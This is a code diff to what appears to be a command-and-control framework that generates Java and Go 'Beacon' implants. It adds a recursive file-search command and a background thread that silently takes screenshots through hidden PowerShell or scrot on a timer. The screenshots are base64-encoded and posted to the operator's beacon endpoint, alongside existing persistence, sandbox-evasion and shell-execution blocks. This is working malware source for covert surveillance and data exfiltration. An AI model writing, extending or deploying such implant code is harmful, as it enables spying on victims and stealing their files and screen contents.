@@ -4020,6 +4020,75 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
 
   const bgCall = ev.background ? '\n        background();' : '';
 
+  // ── Java feature blocks ───────────────────────────────────────────────────
+  const javaFindBlock = features.find ? `
+        if (cmd.startsWith("find ")) {
+            String farg = cmd.substring(5).trim();
+            String[] fparts = farg.split("\\\\s+", 2);
+            String fpat = fparts.length == 2 ? fparts[1] : fparts[0];
+            String fpath = fparts.length == 2 ? fparts[0] : cwd;
+            if (!new File(fpath).isAbsolute()) fpath = cwd + File.separator + fpath;
+            java.nio.file.PathMatcher _pm = java.nio.file.FileSystems.getDefault().getPathMatcher("glob:" + fpat.toLowerCase());
+            java.util.List<String> _res = new java.util.ArrayList<>();
+            try {
+                java.nio.file.Files.walkFileTree(java.nio.file.Paths.get(fpath), new java.nio.file.SimpleFileVisitor<java.nio.file.Path>() {
+                    public java.nio.file.FileVisitResult visitFile(java.nio.file.Path f, java.nio.file.attribute.BasicFileAttributes a) {
+                        if (_pm.matches(java.nio.file.Paths.get(f.getFileName().toString().toLowerCase()))) {
+                            _res.add(f.toAbsolutePath() + "  (" + a.size() + " B)");
+                        }
+                        return _res.size() >= 500 ? java.nio.file.FileVisitResult.TERMINATE : java.nio.file.FileVisitResult.CONTINUE;
+                    }
+                    public java.nio.file.FileVisitResult visitFileFailed(java.nio.file.Path f, java.io.IOException e) { return java.nio.file.FileVisitResult.CONTINUE; }
+                });
+                if (_res.size() >= 500) _res.add("... (truncated at 500 results)");
+                return _res.isEmpty() ? "No files found." : String.join("\\n", _res);
+            } catch (Exception e) { return "Error: " + e.getMessage(); }
+        }
+` : '';
+
+  const javaSchedSetupBlock = features.screenshotSched ? `
+    private static volatile int _schedInterval = 0;
+    private static volatile long _schedNext = 0L;
+    private static void _schedShot() {
+        try {
+            File tmp = File.createTempFile("sched_", ".png"); tmp.deleteOnExit();
+            if (isWin) {
+                String psCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('" + tmp.getAbsolutePath().replace("\\\\\\\\", "\\\\\\\\\\\\\\\\") + "')";
+                new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-Command", psCmd).redirectErrorStream(true).start().waitFor();
+            } else { new ProcessBuilder("scrot", tmp.getAbsolutePath()).redirectErrorStream(true).start().waitFor(); }
+            if (!tmp.exists() || tmp.length() == 0) return;
+            byte[] d = Files.readAllBytes(tmp.toPath()); tmp.delete();
+            String b64 = Base64.getEncoder().encodeToString(d);
+            String fname = "sched_" + System.currentTimeMillis() + ".png";
+            post(${xL('/api/beacon/push')}, "{\\"agent_id\\":\\"" + agentId + "\\",\\"output\\":\\"__b64file__:" + fname + ":" + b64 + "\\"}");
+        } catch (Exception ignored) {}
+    }
+    static {
+        Thread _st = new Thread(() -> {
+            while (true) {
+                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                long now = System.currentTimeMillis();
+                if (_schedInterval > 0 && now >= _schedNext) {
+                    _schedNext = now + (long)_schedInterval * 60000L;
+                    _schedShot();
+                }
+            }
+        });
+        _st.setDaemon(true); _st.start();
+    }
+` : '';
+
+  const javaSchedCmdBlock = features.screenshotSched ? `
+        if (cmd.startsWith("screenshot_sched ")) {
+            try {
+                int _n = Integer.parseInt(cmd.split("\\\\s+")[1]);
+                if (_n < 0) return "Usage: screenshot_sched <minutes> (0 = stop)";
+                _schedInterval = _n; _schedNext = 0L;
+                return _n == 0 ? "Screenshot schedule stopped." : "Auto-screenshot every " + _n + " min. Use screenshot_sched 0 to stop.";
+            } catch (Exception e) { return "Usage: screenshot_sched <minutes> (0 = stop)"; }
+        }
+` : '';
+
   const persistBlock = persist ? `
     private static void persist() {
         String os = System.getProperty("os.name","").toLowerCase();
@@ -4129,6 +4198,7 @@ public class Beacon {
     ${uaList}
     ${sandboxBlock}
     ${bgBlock}
+    ${javaSchedSetupBlock}
     ${persistBlock}
     ${killDateBlock}
     ${encryptBlock}
@@ -4469,6 +4539,7 @@ public class Beacon {
             return sb.toString();
         }
 
+        ${javaFindBlock}${javaSchedCmdBlock}
         // Shell command
         try {
             ProcessBuilder pb = isWin
@@ -4642,6 +4713,73 @@ func _background() {
 }` : '';
   const bgCall = ev.background ? '\n\t_background()' : '';
 
+  // ── Go feature blocks ─────────────────────────────────────────────────────
+  const goFindBlock = features.find ? `
+\tif strings.HasPrefix(cmd, "find ") {
+\t\tfarg := strings.TrimSpace(cmd[5:])
+\t\tparts := strings.SplitN(farg, " ", 2)
+\t\tvar fpat, fpath string
+\t\tif len(parts) == 2 { fpat = parts[1]; fpath = parts[0] } else { fpat = parts[0]; fpath = _cwd }
+\t\tif !filepath.IsAbs(fpath) { fpath = filepath.Join(_cwd, fpath) }
+\t\tfpat = strings.ToLower(fpat)
+\t\tvar res []string
+\t\t_ = filepath.Walk(fpath, func(p string, fi os.FileInfo, err error) error {
+\t\t\tif err != nil || fi.IsDir() { return nil }
+\t\t\tname := strings.ToLower(fi.Name())
+\t\t\tif ok, _ := filepath.Match(fpat, name); ok {
+\t\t\t\tres = append(res, fmt.Sprintf("%s  (%d B)", p, fi.Size()))
+\t\t\t\tif len(res) >= 500 { res = append(res, "... (truncated at 500 results)"); return filepath.SkipAll }
+\t\t\t}
+\t\t\treturn nil
+\t\t})
+\t\tif len(res) == 0 { return "No files found." }
+\t\treturn strings.Join(res, "\\n")
+\t}
+` : '';
+
+  const goSchedSetupBlock = features.screenshotSched ? `
+var _schedInterval int = 0
+var _schedNext     int64 = 0
+
+func _schedShot() {
+\ttmp := filepath.Join(os.TempDir(), fmt.Sprintf("sched_%d.png", time.Now().UnixMilli()))
+\tvar err error
+\tif isWin {
+\t\tpsCmd := "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('" + tmp + "')"
+\t\terr = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd).Run()
+\t} else { err = exec.Command("scrot", tmp).Run() }
+\tif err != nil { return }
+\tdata, err := os.ReadFile(tmp); os.Remove(tmp)
+\tif err != nil { return }
+\tb64 := base64.StdEncoding.EncodeToString(data)
+\tfname := fmt.Sprintf("sched_%d.png", time.Now().UnixMilli())
+\t_post("/api/beacon/push", map[string]interface{}{"agent_id": _agentID, "output": "__b64file__:" + fname + ":" + b64})
+}
+
+func init() {
+\tgo func() {
+\t\tfor {
+\t\t\ttime.Sleep(5 * time.Second)
+\t\t\tnow := time.Now().UnixMilli()
+\t\t\tif _schedInterval > 0 && now >= _schedNext {
+\t\t\t\t_schedNext = now + int64(_schedInterval)*60000
+\t\t\t\t_schedShot()
+\t\t\t}
+\t\t}
+\t}()
+}
+` : '';
+
+  const goSchedCmdBlock = features.screenshotSched ? `
+\tif strings.HasPrefix(cmd, "screenshot_sched ") {
+\t\tn, err := strconv.Atoi(strings.TrimSpace(cmd[17:]))
+\t\tif err != nil || n < 0 { return "Usage: screenshot_sched <minutes> (0 = stop)" }
+\t\t_schedInterval = n; _schedNext = 0
+\t\tif n == 0 { return "Screenshot schedule stopped." }
+\t\treturn fmt.Sprintf("Auto-screenshot every %d min. Use screenshot_sched 0 to stop.", n)
+\t}
+` : '';
+
   // ── Kill date ────────────────────────────────────────────────────────────
   const killDateBlock = killDate ? `
 func _checkKillDate() {
@@ -4755,7 +4893,7 @@ ${bgBlock}
 ${killDateBlock}
 ${persistBlock}
 ${fetchKeyBlock}
-
+${goSchedSetupBlock}
 func _post(path string, payload interface{}) map[string]interface{} {
 \tdata, _ := json.Marshal(payload)
 \tbody := _encBody(data)
@@ -4987,6 +5125,7 @@ func _runCmd(cmd, taskID string) string {
 \t\t}()
 \t\treturn "__pty_started__"
 \t}
+\t${goFindBlock}${goSchedCmdBlock}
 \tif strings.HasPrefix(cmd, "shell ") { cmd = cmd[6:] }
 \tif cmd == "cd" || cmd == "cd ." { return _cwd }
 \tif strings.HasPrefix(cmd, "cd ") {
